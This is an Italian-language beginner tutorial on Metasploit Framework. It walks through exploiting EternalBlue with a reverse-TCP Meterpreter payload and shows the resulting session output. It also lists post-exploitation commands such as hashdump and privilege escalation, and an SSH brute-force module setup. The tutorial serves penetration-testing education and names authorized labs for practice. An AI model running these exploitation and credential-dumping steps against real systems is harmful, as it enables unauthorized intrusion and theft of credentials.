# Introduzione a Metasploit Framework

## Cos'è Metasploit

**Metasploit Framework** è il tool di exploitation più usato al mondo nel penetration testing. È open source, mantenuto da Rapid7, e include centinaia di exploit, payload, scanner e moduli ausiliari pronti all'uso.

Se Nmap è il radar che mappa il campo di battaglia, Metasploit è l'arsenale da cui prendi le armi.

> Attenzione: Metasploit va usato **solo su sistemi per cui hai autorizzazione esplicita**. Usarlo su sistemi altrui è reato.

---

## Installazione

Metasploit è preinstallato su **Kali Linux** e **Parrot OS**. Su altri sistemi:

```bash
# Kali / Parrot (già installato, aggiorna)
sudo apt update && sudo apt install metasploit-framework

# Script di installazione ufficiale (altri Linux)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

---

## Struttura di Metasploit

Prima di usarlo, capisci come è organizzato:

```
Metasploit Framework
├── Exploit      → codice che sfrutta una vulnerabilità
├── Payload      → cosa esegui dopo l'exploit (shell, meterpreter)
├── Auxiliary    → scanner, fuzzer, brute forcer (non exploitano)
├── Post         → moduli da usare dopo aver ottenuto accesso
├── Encoder      → offuscamento del payload
└── Evasion      → tecniche per bypassare antivirus
```

---

## Avvio e comandi base

```bash
# Avvia la console interattiva
msfconsole

# (opzionale) avvia il database PostgreSQL prima
sudo service postgresql start
msfdb init
msfconsole
```

Una volta dentro `msfconsole`, i comandi principali sono:

```
help                    → lista tutti i comandi
search <keyword>        → cerca moduli
use <modulo>            → seleziona un modulo
info                    → info sul modulo selezionato
show options            → mostra le opzioni da configurare
set <OPZIONE> <valore>  → imposta un'opzione
run / exploit           → esegui il modulo
back                    → torna al menu principale
sessions                → gestisci le sessioni attive
```

---

## Flusso base di un exploit

### Step 1: cerca un exploit

```
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Rank
   -  ----                                      ----
   0  exploit/windows/smb/ms17_010_eternalblue  excellent
   1  exploit/windows/smb/ms17_010_psexec       normal
```

### Step 2: seleziona e configura

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > show options

Module options:
   RHOSTS    → IP del target (obbligatorio)
   RPORT     → porta, default 445
   LHOST     → il tuo IP (per la reverse shell)
   LPORT     → la tua porta in ascolto

msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
```

### Step 3: scegli il payload

```
msf6 exploit(ms17_010_eternalblue) > show payloads

# I più comuni:
windows/x64/meterpreter/reverse_tcp   → Meterpreter (potente)
windows/x64/shell/reverse_tcp         → shell classica

msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
```

### Step 4: esegui

```
msf6 exploit(ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Sending stage (200774 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened

meterpreter >
```

Hai una sessione attiva.

---

## Meterpreter: comandi essenziali

**Meterpreter** è un payload avanzato che gira in memoria, difficile da rilevare. È molto più potente di una shell classica.

```
meterpreter > sysinfo          → info sul sistema
meterpreter > getuid           → utente corrente
meterpreter > getsystem        → tenta privilege escalation a SYSTEM
meterpreter > hashdump         → dump degli hash NTLM (richiede SYSTEM)
meterpreter > shell            → apre una shell classica
meterpreter > upload file.exe  → carica un file
meterpreter > download file    → scarica un file
meterpreter > screenshot       → cattura screenshot
meterpreter > ps               → lista processi
meterpreter > migrate <PID>    → migra in un altro processo
meterpreter > background       → manda la sessione in background
```

---

## Moduli Auxiliary: scanner senza exploit

I moduli `auxiliary` sono utili per enumerazione e scanning senza necessariamente exploitare nulla.

```
# Scanner SMB
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Brute force SSH
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

---

## Workspace: organizza il tuo lavoro

Se hai il database attivo, puoi usare i **workspace** per separare diversi engagement:

```
workspace                  → lista workspace
workspace -a cliente_abc   → crea nuovo workspace
workspace cliente_abc      → seleziona
hosts                      → mostra tutti gli host scansionati
services                   → mostra tutti i servizi trovati
vulns                      → mostra vulnerabilità identificate
```

---

## Conclusione

Metasploit è potente, ma ricorda: trovare un exploit che funziona è solo il 20% del lavoro. Il resto è **capire cosa fare dopo** — privilege escalation, lateral movement, persistence, covering tracks. Nei prossimi articoli esploreremo queste fasi.

Inizia con lab controllati: **Metasploitable2**, **VulnHub**, o le macchine su **TryHackMe** e **HackTheBox** — sono progettate per essere exploitate.
